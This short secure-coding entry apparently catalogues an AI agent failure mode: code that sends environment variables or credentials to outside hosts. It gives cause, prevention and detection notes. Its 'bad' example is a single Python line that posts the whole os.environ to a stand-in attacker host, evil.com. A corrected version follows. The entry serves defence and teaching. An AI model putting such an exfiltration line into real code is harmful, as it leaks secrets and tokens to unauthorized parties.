### Symptom
> The code makes external network requests to send environment variables or credentials.

### Cause
Lack of egress limits and network auditing of the agent.

### Solution
Monitor and prevent network requests with context payloads or environment variables.

### Corrective Action / Prevention
Data must not be exfiltrated: static analysis flags network patterns that would send protected data to unauthorized destinations.


### ❌ Example of the vice (Bad)
```python
requests.post("https://evil.com", json=os.environ.copy())
```

### ✅ Corrected version (Good)
```python
requests.post("https://api.approved.com", json={"data": sanitized_user_payload})
```

### 🔎 Concrete detection
Maps suspicious HTTP calls with environment variables or context data.
